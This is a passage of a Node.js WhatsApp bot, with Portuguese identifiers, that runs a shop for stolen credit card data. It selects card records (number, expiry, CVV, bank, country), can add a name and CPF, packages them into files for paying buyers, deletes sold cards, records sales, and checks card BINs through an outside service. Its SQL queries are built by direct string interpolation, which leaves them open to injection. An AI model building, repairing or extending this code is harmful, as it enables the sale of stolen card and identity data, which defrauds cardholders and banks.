            TIPOCC_PACOTE = ITEM_FILA_PACOTE["TIPOCC"]
            PROCESSADO_PACOTE = ITEM_FILA_PACOTE["PROCESSADO"]
            DATA_INSERIDO_MS_PACOTE = ITEM_FILA_PACOTE["DATA_INSERIDO_MS"]

            console.log(`Processando ID PREPARO PACOTE: ${ID_PACOTE} | Quantidade: ${QUANTIDADE_PACOTE} | PROCESSADO: ${PROCESSADO_PACOTE}`)
            ITEM_FILA_PACOTE = "TO PREPARANDO PACOTE PARA ENVIAR"

        }

        Data_Toda = new Date(parseInt(Date.now())).toLocaleString()
        Div_Data = Data_Toda.toString().split(" ")

        Data_File = Div_Data[0]
        Data_File = Data_File.toString().replace(/\//igm, ' ');
        Data_File = Data_File.toString().replace(/[^0-9\s]/igm, '');

        Hora_File = Div_Data[1]
        Hora_File = Hora_File.toString().replace(/\:/igm, ' ');
        Hora_File = Hora_File.toString().replace(/[^0-9\s]/igm, '');

        Nome_Bot_File = Nome_Bot.toString().replace(/[^a-zA-Z\s]/igm, '');

        Numero = CONTATO_PACOTE.toString().replace(/[^0-9]/igm, '')
        var Nome_File_Visual = `${QUANTIDADE_PACOTE} CCs ${COLUNA_PACOTE} - ${Nome_Bot_File} PARA ${Numero} DATA ${Data_File} HORA ${Hora_File}.txt`
        var Nome_File = __dirname + `\\Pacotes\\${Nome_File_Visual}`
        Nome_File = Nome_File.replace(/\\/igm, '/');
        //console.log(Nome_File)

        Array_Conteudo_Arquivo = []

        NOME_CPF_NA_MIX = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'NOME_CPF_NA_MIX'`).get()["VALOR"]
        MODO_SAIDA_MIX = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MODO_SAIDA_MIX'`).get()["VALOR"]

        if (COLUNA_PACOTE === "MIX") {
            Array_CCS = await DataBase_Better.prepare(`SELECT * FROM CCS WHERE TIPOCC = '${TIPOCC_PACOTE}' AND NIVEL NOT IN (SELECT NIVEL FROM NIVEL_IGNORAR)`).all();
            console.log(`Separando pacote de CCS para Pacote MIX`)
        } else {
            Array_CCS = await DataBase_Better.prepare(`SELECT * FROM CCS WHERE ${COLUNA_PACOTE} = '${PARAMETRO_PACOTE}' AND TIPOCC = '${TIPOCC_PACOTE}' AND NIVEL NOT IN (SELECT NIVEL FROM NIVEL_IGNORAR)`).all();
            console.log(`Separando pacote de CCS ${COLUNA_PACOTE} ${PARAMETRO_PACOTE}.`)
        }

        if (Array_CCS.length === 0 || Array_CCS.length < parseInt(QUANTIDADE_PACOTE)) {

            SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${CONTATO_PACOTE}'`).get()["SALDO"]
            SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2)

            NOVO_SALDO = parseFloat(SALDO_USUARIO) + parseFloat(VALOR_PACOTE)
            NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)

            await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${CONTATO_PACOTE}'`).run()

            Texto = `*INFELIZMENTE NÃO DEU PARA SEPARAR SEU PACOTE DE CCs, IREI LHE REEMBOLSAR!*

*SALDO ANTERIOR:* R$: ${SALDO_USUARIO}

*VALOR REEMBOLSADO!:* R\$:${VALOR_PACOTE}

*SALDO ATUAL:* R\$:${NOVO_SALDO}`

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_PACOTE}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

            await DataBase_Better.prepare(`UPDATE PREPARAR_PACOTEV3 SET PROCESSADO = '2' WHERE _rowid_ = '${ID_PACOTE}'`).run()
            ITEM_FILA_PACOTE = "ACABEI"
            return
        }

        shuffle(Array_CCS);

        for (let i_pacote = 0; i_pacote < QUANTIDADE_PACOTE; i_pacote++) {
            console.log(`${i_pacote}/${QUANTIDADE_PACOTE} CCs colocadas no arquivo!`)

            if (NOME_CPF_NA_MIX === "1") {
                if (Array_CCS[i_pacote]["DADOS"].toString() === "#") {
                    Array_Dados = await Obter_Nome_CPF()
                    DADOS = `NOME:${Array_Dados[0]["NOME"]}
CPF:${Array_Dados[0]["CPF"]}`
                } else {
                    DADOS = ` - ${Array_CCS[i_pacote]["DADOS"]}`
                }
            } else {
                DADOS = ""
            }

            if (MODO_SAIDA_MIX === "1") {
                Array_Conteudo_Arquivo.push(`${Array_CCS[i_pacote]["NUMERO"]}|${Array_CCS[i_pacote]["MES"]}|${Array_CCS[i_pacote]["ANO"]}|${Array_CCS[i_pacote]["CVV"]} - ${Array_CCS[i_pacote]["BANDEIRA"]} - ${Array_CCS[i_pacote]["TIPO"]} - ${Array_CCS[i_pacote]["NIVEL"]} - ${Array_CCS[i_pacote]["BANCO"]} - ${Array_CCS[i_pacote]["PAIS"]}${DADOS}\n`)
            } else if (MODO_SAIDA_MIX === "2") {
                Array_Conteudo_Arquivo.push(`💎 ${Array_CCS[i_pacote]["NUMERO"]}|${Array_CCS[i_pacote]["MES"]}|${Array_CCS[i_pacote]["ANO"]}|${Array_CCS[i_pacote]["CVV"]} 🚀 Bandeira: ${Array_CCS[i_pacote]["BANDEIRA"]} BANCO ${Array_CCS[i_pacote]["BANCO"]} ${Array_CCS[i_pacote]["NIVEL"]} ${Array_CCS[i_pacote]["PAIS"]}${DADOS}  (APROVADA)\n\n`);
            }
            await delay(1000)
            await DataBase_Better.prepare(`INSERT INTO PCT_CCS_SEPARADAS_ENVIAR (CC,ID_CONTATO,DATA_INSERIDO_MS) VALUES ('${Array_CCS[i_pacote]["NUMERO"]}|${Array_CCS[i_pacote]["MES"]}|${Array_CCS[i_pacote]["ANO"]}|${Array_CCS[i_pacote]["CVV"]} - ${Array_CCS[i_pacote]["BANDEIRA"]} - ${Array_CCS[i_pacote]["TIPO"]} - ${Array_CCS[i_pacote]["NIVEL"]} - ${Array_CCS[i_pacote]["BANCO"]} - ${Array_CCS[i_pacote]["PAIS"]}${DADOS}','${CONTATO_PACOTE}','${Date.now()}') ON CONFLICT DO NOTHING`).run()
            await delay(1000)
            await DataBase_Better.prepare(`DELETE FROM CCS WHERE NUMERO = ${Array_CCS[i_pacote]["NUMERO"]}`).run()
        }

        const writeStream = fs.createWriteStream(Nome_File);
        // escreve cada valor do array na linha de quebra do arquivo
        Array_Conteudo_Arquivo.forEach(value => writeStream.write(`${value}\n`));
        // o evento de término é emitido quando todos os dados são liberados do fluxo
        writeStream.on('finish', async () => {
            console.log(`Arquivo gerado e preenchido com ${QUANTIDADE_PACOTE} CCs`)

            MENSAGEM_AO_COMPRAR_CC = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_CC'`).get()["VALOR"]
            Texto_Usuario = `📦 *PACOTE CCs COMPRADO!*

📦 *QUANTIDADE:* ${QUANTIDADE_PACOTE}
💰 *VALOR CC: R$:* ${VALOR_PACOTE}
🛠️ *${COLUNA_PACOTE}:* ${PARAMETRO_PACOTE}

◎ ══════ ❈ ══════ ◎

${MENSAGEM_AO_COMPRAR_CC}
`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_PACOTE}', 
'sendImage',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Comprou_Mix_PV}',
'${Date.now()}')`).run()

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_PACOTE}',
'sendFile',
'${Nome_File_Visual}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${Nome_File}',
'${Date.now()}')`).run()

            console.log("Arquivo Enviado!")
            await DataBase_Better.prepare(`INSERT INTO PACOTES_CC_VENDIDOSV3 (QUANTIDADE,VALOR,COLUNA,PARAMETRO,TIPOCC,COMPRADOR,DATA_INSERIDO_MS) VALUES ('${QUANTIDADE_PACOTE}','${VALOR_PACOTE}','${COLUNA_PACOTE}','${PARAMETRO_PACOTE}','${TIPOCC_PACOTE}','${CONTATO_PACOTE}','${Date.now()}')`).run()
            await DataBase_Better.prepare(`UPDATE PREPARAR_PACOTEV3 SET PROCESSADO = '1' WHERE _rowid_ = '${ID_PACOTE}'`).run()
            ITEM_FILA_PACOTE = "ACABEI"
            return

        });
        // trata os erros no processo de escrita
        writeStream.on('error', (err) => {
            console.error(`There is an error writing the file => ${err}`)
        });
        //fecha o fluxo
        writeStream.end();

    }, 1000);
}


async function BIN_CHECKER(NUMERO) {
    return new Promise(async resolve => {
        try {
            if (QUALBINCHECKER.indexOf("infocard") > -1) {
                URLBIN = QUALBINCHECKER.replace(/infocard/igm, `${NUMERO}|00|00|000`);
            } else {
                Digito_BIN = NUMERO.toString().match(/./igm)
                BIN = `${Digito_BIN[0]}${Digito_BIN[1]}${Digito_BIN[2]}${Digito_BIN[3]}${Digito_BIN[4]}${Digito_BIN[5]}`
                URLBIN = QUALBINCHECKER.replace(/infobin/igm, BIN);
            }

            var options = {
                'method': 'GET',
                'url': URLBIN,
                rejectUnauthorized: false,
            };
            request(options, function (error, response) {
                if (error) throw new Error(error);
                resolve(response.body)
            });

        } catch (error) {
            console.log(error)
        }
    });
}


ITEM_FILA_MENSAGEM = "NÃO TEM MENSAGEM A ENVIAR"
async function Fila_SendsZap(client) {
    setInterval(async function () {
        if (ITEM_FILA_MENSAGEM === "ME PREPARANDO PARA ENVIAR MENSAGEM") {
            //ESPERANDO PORQUE TEM OUTRA MENSAGEM SENDO PROCESSADA
            return
        }
        //SE PASSEI AQUI QUER DIZER QUE A FILA TA LIBERADA PARA PROCESSAR OUTRA
        ITEM_FILA_MENSAGEM = await DataBase_Better.prepare(`SELECT _rowid_,* FROM MENSAGENS_ENVIARV3 WHERE PROCESSADO = '0' LIMIT 1`).get()
        if (ITEM_FILA_MENSAGEM === undefined) {
            //OLHEI MAS NÃO TEM NADA PARA FAZER AINDA
            ITEM_FILA_MENSAGEM = "NÃO TEM MENSAGEM A ENVIAR"
            return
        } else {
            // console.log('\x1b[33m%s\x1b[0m',LinhaAtual(new Date(parseInt(Date.now())).toLocaleString()))
            //OPA AGORA TEM UMA MENSAGEM QUE VOU PROCESSAR AGORA
            /*
            PROCESSADO = 0 => Não precessado
            PROCESSADO = 1 => Processado/Enviada
            */

            ID_MENSAGEM = ITEM_FILA_MENSAGEM["rowid"]
            PROCESSADO_MENSAGEM = ITEM_FILA_MENSAGEM["PROCESSADO"]
            ID_CONTATO_MENSAGEM = ITEM_FILA_MENSAGEM["ID_CONTATO"]
            TIPO_MENSAGEM = ITEM_FILA_MENSAGEM["TIPO"]
            TEXTO_MENSAGEM = ITEM_FILA_MENSAGEM["TEXTO"]
            CONSTRUCAO_LISTMESSAGE_buttonText_MENSAGEM = ITEM_FILA_MENSAGEM["CONSTRUCAO_LISTMESSAGE_buttonText"]
            CONSTRUCAO_LISTMESSAGE_title_MENSAGEM = ITEM_FILA_MENSAGEM["CONSTRUCAO_LISTMESSAGE_title"]
            CONSTRUCAO_LISTMESSAGE_rows_MENSAGEM = ITEM_FILA_MENSAGEM["CONSTRUCAO_LISTMESSAGE_rows"]
            Caminho_arquivo_MENSAGEM = ITEM_FILA_MENSAGEM["Caminho_arquivo"]//QUANDO É sendListMessage ESSE CAMINHO VIRA O iD_Footer
            DATA_INSERIDO_MS_MENSAGEM = ITEM_FILA_MENSAGEM["DATA_INSERIDO_MS"]

            console.log(`Enviando mensagem ID:${ID_MENSAGEM} para ${ID_CONTATO_MENSAGEM}`)
            ITEM_FILA_MENSAGEM = "ME PREPARANDO PARA ENVIAR MENSAGEM"
            // console.log('\x1b[33m%s\x1b[0m',LinhaAtual(new Date(parseInt(Date.now())).toLocaleString()))
        }
        MILESEGUNDOS_INTERACAO_LOOP_MANIPULACAOV2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MILESEGUNDOS_INTERACAO_LOOP_MANIPULACAOV2'`).get()["VALOR"]
        await delay(MILESEGUNDOS_INTERACAO_LOOP_MANIPULACAOV2)
        // console.log('\x1b[33m%s\x1b[0m',LinhaAtual(new Date(parseInt(Date.now())).toLocaleString()))
        //USE ISSO PARA LIBERAR A FILA PARA UMA PRÓXIMA
        // ITEM_FILA_MENSAGEM = "ENVIADA"
        // return
        try {
            // console.log('\x1b[33m%s\x1b[0m',LinhaAtual(new Date(parseInt(Date.now())).toLocaleString()))
            if (TIPO_MENSAGEM === "sendText") {
                await DataBase_Better.prepare(`UPDATE MENSAGENS_ENVIARV3 SET PROCESSADO = '1' WHERE _rowid_ = '${ID_MENSAGEM}'`).run()
                // console.log('\x1b[33m%s\x1b[0m',LinhaAtual(new Date(parseInt(Date.now())).toLocaleString()))
                client.sendText(ID_CONTATO_MENSAGEM, TEXTO_MENSAGEM).then(async (result) => {
                    // console.log('\x1b[33m%s\x1b[0m',LinhaAtual(new Date(parseInt(Date.now())).toLocaleString()))
                }).catch(async(erro) => {
                    console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                    ITEM_FILA_MENSAGEM = "ENVIADA"
                    return
                });
                // console.log('\x1b[33m%s\x1b[0m',LinhaAtual(new Date(parseInt(Date.now())).toLocaleString()))
                ITEM_FILA_MENSAGEM = "ENVIADA"
                return
            }

            if (TIPO_MENSAGEM === "sendListMessage") {
                console.log("ENVIANDO MENU" + ID_CONTATO_MENSAGEM)

                await client.sendListMessage(ID_CONTATO_MENSAGEM, {
                    buttonText: CONSTRUCAO_LISTMESSAGE_buttonText_MENSAGEM,
                    description: TEXTO_MENSAGEM,
                    sections: [
                        {
                            title: CONSTRUCAO_LISTMESSAGE_title_MENSAGEM,
                            rows: JSON.parse(CONSTRUCAO_LISTMESSAGE_rows_MENSAGEM)
                        },
                    ],
                }).then(async (result) => {
                    console.log("ENVIEIIIIII MENU")
                    await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${Caminho_arquivo_MENSAGEM.toString()}|0' WHERE ID_CONTATO = '${ID_CONTATO_MENSAGEM}'`).run()
                    await DataBase_Better.prepare(`UPDATE MENSAGENS_ENVIARV3 SET PROCESSADO = '1' WHERE _rowid_ = '${ID_MENSAGEM}'`).run()
                    ITEM_FILA_MENSAGEM = "ENVIADA"
                }).catch(async(erro) => {
                    console.log(debugLine("Erro = " + (JSON.stringify(erro))));
                    ITEM_FILA_MENSAGEM = "ENVIADA"
                })
                // ITEM_FILA_MENSAGEM = "ENVIADA"
                // return
                return
            }

            if (TIPO_MENSAGEM === "sendImage") {
                await client.sendImage(ID_CONTATO_MENSAGEM, Caminho_arquivo_MENSAGEM, 'foto', TEXTO_MENSAGEM).then(async (result) => {
                    await DataBase_Better.prepare(`UPDATE MENSAGENS_ENVIARV3 SET PROCESSADO = '1' WHERE _rowid_ = '${ID_MENSAGEM}'`).run()
                    ITEM_FILA_MENSAGEM = "ENVIADA"
                    return
                }).catch(async(erro) => {
                    console.error('Error when sending: ', erro);
                    ITEM_FILA_MENSAGEM = "ENVIADA"
                    return
                });
                return
            }

            if (TIPO_MENSAGEM === "sendFile") {
                await client.sendFile(ID_CONTATO_MENSAGEM, Caminho_arquivo_MENSAGEM, TEXTO_MENSAGEM, "").then(async (result) => {
                    await DataBase_Better.prepare(`UPDATE MENSAGENS_ENVIARV3 SET PROCESSADO = '1' WHERE _rowid_ = '${ID_MENSAGEM}'`).run()
                    ITEM_FILA_MENSAGEM = "ENVIADA"
                    return
                }).catch(async(erro) => {
                    console.error('Error when sending: ', erro);
                    ITEM_FILA_MENSAGEM = "ENVIADA"
                    return
                });
                return
            }

        } catch (error) {
            await DataBase_Better.prepare(`UPDATE MENSAGENS_ENVIARV3 SET PROCESSADO = '1' WHERE _rowid_ = '${ID_MENSAGEM}'`).run()
            console.log(`ERRO SENDZAP`)
            console.log(error)
            ITEM_FILA_MENSAGEM = "ENVIADA"
            return
        }
    }, 10);
}


ITEM_FILA_MENSAGEM_ADMS_GRUPOS = "NÃO TEM MENSAGEM A ENVIAR"
async function Fila_SendsZap_ADMS_GRUPOS(client) {
    setInterval(async function () {
        if (ITEM_FILA_MENSAGEM_ADMS_GRUPOS === "ME PREPARANDO PARA ENVIAR MENSAGEM") {
            //ESPERANDO PORQUE TEM OUTRA MENSAGEM SENDO PROCESSADA
            return
        }
        //SE PASSEI AQUI QUER DIZER QUE A FILA TA LIBERADA PARA PROCESSAR OUTRA
        ITEM_FILA_MENSAGEM_ADMS_GRUPOS = await DataBase_Better.prepare(`SELECT _rowid_,* FROM MENSAGENS_ENVIARV3_ADMS_GRUPOS WHERE PROCESSADO = '0' LIMIT 1`).get()
        if (ITEM_FILA_MENSAGEM_ADMS_GRUPOS === undefined) {
            //OLHEI MAS NÃO TEM NADA PARA FAZER AINDA
            ITEM_FILA_MENSAGEM_ADMS_GRUPOS = "NÃO TEM MENSAGEM A ENVIAR"
            return
        } else {
            //OPA AGORA TEM UMA MENSAGEM QUE VOU PROCESSAR AGORA
            /*
            PROCESSADO = 0 => Não precessado
            PROCESSADO = 1 => Processado/Enviada
            */

            ID_MENSAGEM_ADMS_GRUPOS = ITEM_FILA_MENSAGEM_ADMS_GRUPOS["rowid"]
            PROCESSADO_MENSAGEM = ITEM_FILA_MENSAGEM_ADMS_GRUPOS["PROCESSADO"]
            ID_CONTATO_MENSAGEM_ADMS_GRUPOS = ITEM_FILA_MENSAGEM_ADMS_GRUPOS["ID_CONTATO"]
            TIPO_MENSAGEM_ADMS_GRUPOS = ITEM_FILA_MENSAGEM_ADMS_GRUPOS["TIPO"]
            TEXTO_MENSAGEM_ADMS_GRUPOS = ITEM_FILA_MENSAGEM_ADMS_GRUPOS["TEXTO"]
            CONSTRUCAO_LISTMESSAGE_buttonText_MENSAGEM_ADMS_GRUPOS = ITEM_FILA_MENSAGEM_ADMS_GRUPOS["CONSTRUCAO_LISTMESSAGE_buttonText"]
            CONSTRUCAO_LISTMESSAGE_title_MENSAGEM_ADMS_GRUPOS = ITEM_FILA_MENSAGEM_ADMS_GRUPOS["CONSTRUCAO_LISTMESSAGE_title"]
            CONSTRUCAO_LISTMESSAGE_rows_MENSAGEM_ADMS_GRUPOS = ITEM_FILA_MENSAGEM_ADMS_GRUPOS["CONSTRUCAO_LISTMESSAGE_rows"]
            Caminho_arquivo_MENSAGEM_ADMS_GRUPOS = ITEM_FILA_MENSAGEM_ADMS_GRUPOS["Caminho_arquivo"]//QUANDO É sendListMessage ESSE CAMINHO VIRA O iD_Footer
            DATA_INSERIDO_MS_MENSAGEM = ITEM_FILA_MENSAGEM_ADMS_GRUPOS["DATA_INSERIDO_MS"]

            console.log(`Log Adm/Grupo ID:${ID_MENSAGEM_ADMS_GRUPOS} para ${ID_CONTATO_MENSAGEM_ADMS_GRUPOS}`)
            ITEM_FILA_MENSAGEM_ADMS_GRUPOS = "ME PREPARANDO PARA ENVIAR MENSAGEM"

        }
        await delay(5000)

        //USE ISSO PARA LIBERAR A FILA PARA UMA PRÓXIMA
        // ITEM_FILA_MENSAGEM_ADMS_GRUPOS = "ENVIADA"
        // return
        try {

            if (TIPO_MENSAGEM_ADMS_GRUPOS === "sendText") {
                await DataBase_Better.prepare(`UPDATE MENSAGENS_ENVIARV3_ADMS_GRUPOS SET PROCESSADO = '1' WHERE _rowid_ = '${ID_MENSAGEM_ADMS_GRUPOS}'`).run()
                client.sendText(ID_CONTATO_MENSAGEM_ADMS_GRUPOS, TEXTO_MENSAGEM_ADMS_GRUPOS).then(async (result) => {
                }).catch(async(erro) => {
                    console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                    ITEM_FILA_MENSAGEM_ADMS_GRUPOS = "ENVIADA"
                    return
                });
                ITEM_FILA_MENSAGEM_ADMS_GRUPOS = "ENVIADA"
                return
            }

            if (TIPO_MENSAGEM_ADMS_GRUPOS === "sendListMessage") {
                await client.sendListMessage(ID_CONTATO_MENSAGEM_ADMS_GRUPOS, {
                    buttonText: CONSTRUCAO_LISTMESSAGE_buttonText_MENSAGEM_ADMS_GRUPOS,
                    description: TEXTO_MENSAGEM_ADMS_GRUPOS,
                    sections: [
                        {
                            title: CONSTRUCAO_LISTMESSAGE_title_MENSAGEM_ADMS_GRUPOS,
                            rows: JSON.parse(CONSTRUCAO_LISTMESSAGE_rows_MENSAGEM_ADMS_GRUPOS)
                        },
                    ],
                }).then(async (result) => {
                    await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${Caminho_arquivo_MENSAGEM_ADMS_GRUPOS.toString()}|0' WHERE ID_CONTATO = '${ID_CONTATO_MENSAGEM_ADMS_GRUPOS}'`).run()
                    await DataBase_Better.prepare(`UPDATE MENSAGENS_ENVIARV3_ADMS_GRUPOS SET PROCESSADO = '1' WHERE _rowid_ = '${ID_MENSAGEM_ADMS_GRUPOS}'`).run()
                    ITEM_FILA_MENSAGEM_ADMS_GRUPOS = "ENVIADA"
                    return

                }).catch(async(erro) => {
                    await DataBase_Better.prepare(`UPDATE MENSAGENS_ENVIARV3_ADMS_GRUPOS SET PROCESSADO = '1' WHERE _rowid_ = '${ID_MENSAGEM_ADMS_GRUPOS}'`).run()
                    console.log(debugLine("Erro = " + (JSON.stringify(erro))));
                    ITEM_FILA_MENSAGEM_ADMS_GRUPOS = "ENVIADA"
                    return
                })
                return
            }

            if (TIPO_MENSAGEM_ADMS_GRUPOS === "sendImage") {
                await client.sendImage(ID_CONTATO_MENSAGEM_ADMS_GRUPOS, Caminho_arquivo_MENSAGEM_ADMS_GRUPOS, 'foto', TEXTO_MENSAGEM_ADMS_GRUPOS).then(async (result) => {
                    await DataBase_Better.prepare(`UPDATE MENSAGENS_ENVIARV3_ADMS_GRUPOS SET PROCESSADO = '1' WHERE _rowid_ = '${ID_MENSAGEM_ADMS_GRUPOS}'`).run()
                    ITEM_FILA_MENSAGEM_ADMS_GRUPOS = "ENVIADA"
                    return
                }).catch(async(erro) => {
                    await DataBase_Better.prepare(`UPDATE MENSAGENS_ENVIARV3_ADMS_GRUPOS SET PROCESSADO = '1' WHERE _rowid_ = '${ID_MENSAGEM_ADMS_GRUPOS}'`).run()
                    console.error('Error when sending: ', erro);
                    ITEM_FILA_MENSAGEM_ADMS_GRUPOS = "ENVIADA"
                    return
                });
                return
            }

            if (TIPO_MENSAGEM_ADMS_GRUPOS === "sendFile") {
                await client.sendFile(ID_CONTATO_MENSAGEM_ADMS_GRUPOS, Caminho_arquivo_MENSAGEM_ADMS_GRUPOS, TEXTO_MENSAGEM_ADMS_GRUPOS, "").then(async (result) => {
                    await DataBase_Better.prepare(`UPDATE MENSAGENS_ENVIARV3_ADMS_GRUPOS SET PROCESSADO = '1' WHERE _rowid_ = '${ID_MENSAGEM_ADMS_GRUPOS}'`).run()
                    ITEM_FILA_MENSAGEM_ADMS_GRUPOS = "ENVIADA"
                    return
                }).catch(async(erro) => {
                    await DataBase_Better.prepare(`UPDATE MENSAGENS_ENVIARV3_ADMS_GRUPOS SET PROCESSADO = '1' WHERE _rowid_ = '${ID_MENSAGEM_ADMS_GRUPOS}'`).run()
                    console.error('Error when sending: ', erro);
                    ITEM_FILA_MENSAGEM_ADMS_GRUPOS = "ENVIADA"
                    return
                });
                return
            }

        } catch (error) {
            await DataBase_Better.prepare(`UPDATE MENSAGENS_ENVIARV3_ADMS_GRUPOS SET PROCESSADO = '1' WHERE _rowid_ = '${ID_MENSAGEM_ADMS_GRUPOS}'`).run()
            console.log(`ERRO SENDZAP`)
            console.log(error)
            ITEM_FILA_MENSAGEM_ADMS_GRUPOS = "ENVIADA"
            return
        }
    }, 100);
}


Setinterval_Reiniciar_Auto_Bug_Rato = false
async function Reiniciar_Auto_Bug_Rato(client) {
    if (Setinterval_Reiniciar_Auto_Bug_Rato === false) {
        Setinterval_Reiniciar_Auto_Bug_Rato = true
        setInterval(async function () {
            Reiniciar_Auto_Bug_Rato(client)
        }, 30000);
    }
    if (Ativar_Reiniciar_Auto_Bug_Rato === false) {
        return
    }
    CONVERSAS_PENDENTES = await DataBase_Better.prepare(`SELECT _rowid_,* FROM MENSAGENS_ENVIARV3 WHERE PROCESSADO = '0' ORDER BY DATA_MS_INSERIDO ASC LIMIT 1`).get()
    if (CONVERSAS_PENDENTES === undefined) {
        // console.log(CONVERSAS_PENDENTES)

        //         Texto = `§§§=:=§§§`
        //         await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
        // '0',
        // '0000000000',
        // 'sendText',
        // '${Texto}',
        // 'CONSTRUCAO_LISTMESSAGE_buttonText',
        // 'CONSTRUCAO_LISTMESSAGE_title',
        // 'CONSTRUCAO_LISTMESSAGE_rows',
        // 'Caminho_arquivo',
        // '${Date.now()}')`).run()

        return
    } else {

        // console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
        ID_MENSAGEM = CONVERSAS_PENDENTES["rowid"]
        DATA_INSERIDO_MS_MENSAGEM = CONVERSAS_PENDENTES["DATA_MS_INSERIDO"]

        // console.log(new Date(parseInt(Date.now())).toLocaleString())
        // console.log(new Date(parseInt(DATA_INSERIDO_MS_MENSAGEM)).toLocaleString())
        // console.log(new Date(parseInt(DATA_INSERIDO_MS_MENSAGEM) + 60000).toLocaleString())
        // console.log(parseInt(Date.now()))
        // console.log(parseInt(DATA_INSERIDO_MS_MENSAGEM) + 60000)
        // console.log(parseInt(Date.now()) >= parseInt(DATA_INSERIDO_MS_MENSAGEM) + 60000)
        if ((parseInt(Date.now()) >= parseInt(DATA_INSERIDO_MS_MENSAGEM) + 60000) && (parseInt(Date.now()) > parseInt(Start_MS) + 180000)) {
            console.log("VOU REINICIAR")
            console.log('\x1b[33m%s\x1b[0m', LinhaAtual())

            Texto = `*DEU AQUELE BUG RARO [${new Date(parseInt(Date.now())).toLocaleString()}], DETECTEI E REINICIEI AUTOMATICAMENTE!*`

            for await (adm of Adms) {
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            }

            exec(`pm2 restart ${Nome_Dono}_Supremo`, (error, stdout, stderr) => {
                if (error) {
                    console.log(`error: ${error.message}`);
                    return;
                }
                if (stderr) {
                    console.log(`stderr: ${stderr}`);
                    return;
                }
                console.log(`stdout: ${stdout}`);

                return
            })

        }
    }
}

